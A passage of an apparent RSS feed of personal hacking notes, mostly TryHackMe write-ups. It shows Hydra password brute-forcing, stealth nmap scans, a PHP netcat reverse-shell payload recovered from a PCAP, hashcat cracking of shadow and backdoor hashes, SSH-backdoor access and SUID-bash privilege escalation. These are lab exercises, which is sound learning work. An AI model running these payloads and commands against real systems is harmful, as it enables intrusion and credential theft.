&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-P&lt;/span&gt; ~/.local/share/red-team/wordlists/rockyou.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;10.10.152.115&lt;/span&gt; ftp&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Hydra task to break quinn&amp;#39;s password.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -v -f -t 10 -s 10021 -l quinn &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-P&lt;/span&gt; ~/.local/share/red-team/wordlists/rockyou.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;#cb3-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;10.10.152.115&lt;/span&gt; ftp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These quickly return the results &lt;code&gt;eddie:jordan&lt;/code&gt; and &lt;code&gt;quinn:andrea&lt;/code&gt;. Let's try to use &lt;code&gt;nc -nv 10.10.152.115 10021&lt;/code&gt; to log into &lt;code&gt;eddie&lt;/code&gt;'s account.&lt;/p&gt;&lt;pre class=&quot;ftp&quot;&gt;&lt;code&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER eddie
331 Please specify the password.
PASS jordan
230 Login successful.
425 Use PORT or PASV first.
PASV
227 Entering Passive Mode (10,10,152,115,119,101).
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The trick here is that the passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 - o4 are the four octets of the server's IP address (10.10.152.115), and p1 - p2 are the high + low bytes of the port number to connect to, (256 Ã p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, &lt;code&gt;nc -nv 10.10.152.115 30565&lt;/code&gt;. We start this &lt;em&gt;before&lt;/em&gt; entering the LIST command, revealing that &lt;code&gt;eddie&lt;/code&gt; has access to no files.&lt;/p&gt;&lt;p&gt;Let's have the same conversation for &lt;code&gt;quinn&lt;/code&gt;.&lt;/p&gt;&lt;pre class=&quot;ftp&quot;&gt;&lt;code&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open
220 (vsFTPd 3.0.3)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
PASV
227 Entering Passive Mode (10,10,152,115,120,34).
LIST
150 Here comes the directory listing.
226 Directory send OK.
PASV
227 Entering Passive Mode (10,10,152,115,117,85).
RETR ftp_flag.txt
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
QUIT
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time we need to open &lt;em&gt;two&lt;/em&gt; auxiliary netcat sessions. The first, &lt;code&gt;nc -nv 10.10.152.115 30754&lt;/code&gt;, catches the LIST command, which reveals that &lt;code&gt;quinn&lt;/code&gt; has access to an &lt;code&gt;ftp_flag.txt&lt;/code&gt; file. The second, &lt;code&gt;nc -nv 10.10.152.115 30037&lt;/code&gt;, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;We learned two usernames using social engineering: &lt;code&gt;eddie&lt;/code&gt; and &lt;code&gt;quinn&lt;/code&gt;. What is the flag hidden in one of these two account files and accessible via FTP? - THM{321452667098}&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;For the final challenge, we go to &lt;code&gt;http://10.10.152.115:8080&lt;/code&gt;. The challenge is to scan 10.10.152.115 &quot;as covertly as possible&quot;. I'm not really willing to wait 7 months for a scan, but I'll bet that all we need to do is use &lt;code&gt;-T1&lt;/code&gt; and drop &lt;code&gt;-A&lt;/code&gt;.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -Pn -n -T1 -p- 10.10.152.115&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, that didn't work - &quot;71% chance of scan being detected&quot; and we're nowhere near done. That, and the machine expired without me even noticing.&lt;/p&gt;&lt;p&gt;New target IP is 10.10.34.244.&lt;/p&gt;&lt;p&gt;Maybe speed doesn't matter here? Let's try a scan that shouldn't even look like a connection - an ACK scan - but at a more &quot;normal&quot; rate.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -Pn -n -T4 -sA -p- 10.10.34.244&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, that resulted in an almost immediate flag. Switching to &lt;code&gt;-T2&lt;/code&gt; for the timing here also incremented things quite quickly.&lt;/p&gt;&lt;p&gt;What about a null scan? That might actually get me more information than an ACK scan, but should elicit &lt;em&gt;any&lt;/em&gt; response from open ports.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -Pn -n -T4 -sN -p- 10.10.34.244&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&quot;Null scan&quot; is apparently the right answer, as the challenge provided the flag almost immediately (which doesn't &lt;em&gt;actually&lt;/em&gt; make any sense, but whateverâ¦).&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Browsing to &lt;a href=&quot;http://10.10.152.115:8080&quot;&gt;http://10.10.152.115:8080&lt;/a&gt; displays a small challenge that will give you a flag once you solve it. What is the flag? - THM{f7443f99}&lt;/p&gt;&lt;/blockquote&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hydra.md&quot;&gt;Using Hydra&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/File%20Transfer%20Protocol%20%28FTP%29.md&quot;&gt;File Transfer Protocol (FTP)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402&quot;&gt;How to list FTP directories using telnet?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot;&gt;FTP Commands: QUIT, USER, ABOR, ACCT, SYST, XDEL&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot;&gt;FTP Commands: APPE, MLSD, MLST, LIST, RETR, STOR, STOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 2 h 31 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/netsecchallenge&quot;&gt;TryHackMe: Net Sec Challenge&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Net%20Sec%20Challenge.md</guid>
		</item>
		<item>
			<title>OSI Model</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/OSI%20Model.md</link>
			<description>&lt;p&gt;Layer 7: Application (highest)&lt;br /&gt;
Layer 6: Presentation&lt;br /&gt;
Layer 5: Session&lt;br /&gt;
Layer 4: Transport&lt;br /&gt;
Layer 3: Network&lt;br /&gt;
Layer 2: Data link&lt;br /&gt;
Layer 1: Physical (lowest)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/presecurity&quot;&gt;TryHackMe: Pre Security&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/OSI%20Model.md</guid>
		</item>
		<item>
			<title>Overpass 2: Hacked</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Overpass%202%20-%20Hacked.md</link>
			<description>&lt;p&gt;The flags are structured to basically walk us through this room.&lt;/p&gt;&lt;h2 id=&quot;forensics-analyze-the-pcap&quot;&gt;Forensics: Analyze the PCAP&lt;/h2&gt;&lt;p&gt;I've not actually used Wireshark outside of the TryHackMe: Wireshark 101 &quot;room&quot; (and a few short digressions in other rooms), so I'm honestly a little worried about my abilities hereâ¦&lt;/p&gt;&lt;p&gt;Filtering the PCAP file for HTTP requests reveals a single POST from 192.168.179.145 to &lt;a href=&quot;http://192.168.170.159/development/upload.php&quot;&gt;http://192.168.170.159/development/upload.php&lt;/a&gt;. A subsequent request from 192.168.179.145 pulls the directory listing of /development/uploads/, and then GETs /development/uploads/payload.php. This suggests that 192.168.179.145 is the &quot;attacker&quot; and 192.168.179.145 is the target system.&lt;/p&gt;&lt;p&gt;FLAG 1: What was the URL of the page they used to upload a reverse shell? - /development/&lt;/p&gt;&lt;p&gt;We can save off this POST request to get at the uploaded payload.php file, which turns out to have the contents:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode php&quot;&gt;&lt;code class=&quot;sourceCode php&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.170.145 4242 &amp;gt;/tmp/f&amp;quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 2: What payload did the attacker use to gain access? - &lt;code&gt;&amp;lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.170.145 4242 &amp;gt;/tmp/f&quot;)?&amp;gt;&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This is popping a simple reverse shell through netcat that connects back to 192.168.170.145:4242, which would seem to confirm that this was the machine used by the attacker.&lt;/p&gt;&lt;p&gt;This means that penetration occurs when this file is requested in packet 27.&lt;/p&gt;&lt;p&gt;Looking at subsequent TCP packets, we can see what the attacker typed in the packets going from 192.168.170.145 â 192.168.170.159, and the responses in the packets going from 192.168.170.159 â 192.168.170.145. Requests/Responses coming through netcat use the TCP PSH flag, so we can filter by &lt;code&gt;tcp.port == 4242 and tcp.flags.push&lt;/code&gt; to zoom in on this conversation.&lt;/p&gt;&lt;p&gt;The attacker eventually issues &lt;code&gt;su james&lt;/code&gt; to elevate privileges (packet 71), and a few packets down we can see &lt;code&gt;james&lt;/code&gt;'s password.&lt;/p&gt;&lt;p&gt;FLAG 3: What password did the attacker use to privesc? - &lt;code&gt;whenevernoteartinstant&lt;/code&gt;&lt;/p&gt;&lt;p&gt;In packet 112 the attacker cats /etc/shadow, and we get a full dump in packet 114. They then issue &lt;code&gt;git clone https://github.com/NinjaJc01/ssh-backdoor&lt;/code&gt;, generate an SSH private key, and switch to the included &lt;code&gt;backdoor&lt;/code&gt; binary, at which point we lose the thread.&lt;/p&gt;&lt;p&gt;FLAG 4: How did the attacker establish persistence? - &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Returning to packet 114, we can use Copy &amp;gt; Copy Bytes as Printable Text to pull the contents of /etc/shadow (+ a little garbage). After a little cleanup, we have 5 users with passwords (including &lt;code&gt;james&lt;/code&gt;, which we know already).&lt;/p&gt;&lt;p&gt;We extract the hashes and then throw Hashcat at this using the suggested &quot;fasttrack&quot; wordlist.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; -m 1800 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;-O&lt;/span&gt; hashes.txt /usr/share/wordlists/fasttrack.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Four out of the five passwords turn out to be crackable:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;paradox:secuirty3
szymex:abcd123
bee:secret12
muirland:1qaz2wsx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ironically &lt;em&gt;doesn't&lt;/em&gt; include &lt;code&gt;james&lt;/code&gt;!&lt;/p&gt;&lt;p&gt;FLAG 5: How many of the system passwords were crackable? - 4&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/wireshark&quot;&gt;TryHackMe: Wireshark 101&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;research-analyze-the-code&quot;&gt;Research: Analyze the Code&lt;/h2&gt;&lt;p&gt;It turns out that &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor&lt;/a&gt; is a real thing, with the code itself living in &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&quot;&gt;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;FLAG 6: What's the default hash for the backdoor? - &lt;code&gt;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 7: What's the hardcoded salt for the backdoor? - &lt;code&gt;1c362db832f3f864c8c2fe05f2002a05&lt;/code&gt;&lt;/p&gt;&lt;p&gt;The hashPassword() function here takes the SHA-512 hash of the provided password + the salt. The default has is overridden using the &lt;code&gt;-a&lt;/code&gt; flag. We can see that the attacker used this flag when the &lt;code&gt;backdoor&lt;/code&gt; was called in packet 3479.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;./backdoor&lt;/span&gt; -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 8: What was the hash that the attacker used? - &lt;code&gt;6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed&lt;/code&gt;&lt;/p&gt;&lt;p&gt;We can use Hashcat to again crack this.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-m&lt;/span&gt; 1710 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-O&lt;/span&gt; 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 9: What's the password? - &lt;code&gt;november16&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go&quot;&gt;ssh-backdoor / main.go&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;attack-get-back-in&quot;&gt;Attack: Get Back In!&lt;/h2&gt;&lt;p&gt;The last bit of this CTF uses a server, which for this run is at 10.10.114.161. Just visiting that page gives us our first flag.&lt;/p&gt;&lt;p&gt;FLAG 10: What message did the attacker leave as a heading when they defaced the website? - H4ck3d by CooctusClan&lt;/p&gt;&lt;p&gt;We'll get back in using the backdoor that the attacker set up. From the backdoor code we know that the SSH server is running on port 2222, and there don't seem to be any user checks. Soâ¦&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;env&lt;/span&gt; -u SSH_AUTH_SOCK -u SSH_AGENT_PID &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;ssh&lt;/span&gt; -p 2222 user@10.10.114.161&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â¦lets us in as expected (with the password of &lt;code&gt;november16&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;The user flag is in /home/james/user.txt.&lt;/p&gt;&lt;p&gt;FLAG 11: What's the user flag? - &lt;code&gt;thm{d119b4fa8c497ddb0525f7ad200e6567}&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Unfortunately, none of the passwords we cracked earlier work anymore. After checking a couple of possible exploits to get around this, I decided just to see what SUID binaries were on the system (figuring that I'd check them against GTFOBins).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type f -perm -u+s -exec ls -l &lt;span class=&quot;st&quot;&gt;&amp;quot;{}&amp;quot;&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This turned up an unusual file - /home/james/.suid_bash. Could this beâ¦ an SUID copy of Bash? Indeed it is!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/home/james/.suid_bash&lt;/span&gt; -p &lt;span class=&quot;co&quot;&gt;# Root shell!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The root flag is then in /root/root.txt.&lt;/p&gt;&lt;p&gt;FLAG 12: What's the root flag? - &lt;code&gt;thm{d53b2684f169360bb9606c333873144d}&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Exploiting%20Bash.md&quot;&gt;Exploiting Bash&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 1 h 43 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/overpass2hacked&quot;&gt;TryHackMe: Overpass 2: Hacked&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Overpass%202%20-%20Hacked.md</guid>
		</item>
		<item>
			<title>Quick-n-Dirty Python Web Server</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Quick-n-Dirty%20Python%20Web%20Server.md</link>
			<description>&lt;p&gt;Serve files out of the current directory over HTTP using Python 3:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;python3&lt;/span&gt; -m http.server &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The default $PORT is 8080.&lt;/p&gt;&lt;p&gt;Some useful python3 http.server flags:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;&lt;code&gt;--bind ADDRESS&lt;/code&gt;, &lt;code&gt;-b ADDRESS&lt;/code&gt; Specify alternate bind address [default: all interfaces]&lt;/p&gt;&lt;p&gt;&lt;code&gt;--directory DIRECTORY&lt;/code&gt;, &lt;code&gt;-d DIRECTORY&lt;/code&gt; Specify alternative directory [default: current directory]&lt;/p&gt;&lt;/blockquote&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://spoofing.medium.com/how-to-make-a-simple-http-server-using-python-ea35f0b741a4&quot;&gt;How to make a simple HTTP server using python?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Quick-n-Dirty%20Python%20Web%20Server.md</guid>
		</item>
		<item>
			<title>Read a File Beginning With a Dash (-)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Read%20a%20File%20Beginning%20With%20a%20Dash%20%28-%29.md</link>
			<description>&lt;p&gt;The easiest way to read a file beginning with a dash (-) is generally just to prefix it with a path; so, &lt;code&gt;cat ./-&lt;/code&gt; reads a file called &lt;code&gt;-&lt;/code&gt; in the current directory (as opposed to &lt;code&gt;cat -&lt;/code&gt;, which tries to read from STDIN).&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Read%20a%20File%20Beginning%20With%20a%20Dash%20%28-%29.md</guid>
		</item>
		<item>
			<title>Retro</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Retro.md</link>
			<description>&lt;h2 id=&quot;initial-reconnaissance&quot;&gt;Initial Reconnaissance&lt;/h2&gt;&lt;p&gt;This CTF is an earlier version of Blaster without the step-by-step nature of that room. Not 100% sure what the differences are.&lt;/p&gt;&lt;p&gt;The target IP is 10.10.20.185.&lt;/p&gt;&lt;p&gt;As with Blaster, we'll start out As usual, we'll start out by running an nmap scan:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA retro -Pn -A -T4 -sS -script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
